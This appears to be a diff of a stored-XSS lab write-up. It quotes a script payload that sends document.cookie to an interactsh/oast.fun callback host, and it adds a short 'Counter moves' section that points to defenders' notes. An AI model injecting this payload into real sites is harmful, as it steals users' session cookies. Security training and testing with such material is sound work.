@@ -9,3 +9,7 @@ Using [app.interactsh.com](https://app.interactsh.com), use whatever title, and 
 ```text
 <script>document.write("<img src='https://cgn1cqt2vtc0000xbc8ggekoscryyyyyb.oast.fun?="+document.cookie+"'></img>");</script>
 ```
+
+## Counter moves
+
+XSS stored 1 is the variant in play. A client-side finding still needs a server-side control behind it. Defenders' notes on this are under [the application layer as a target](https://blue.tymyrddin.dev/docs/counter/app/).
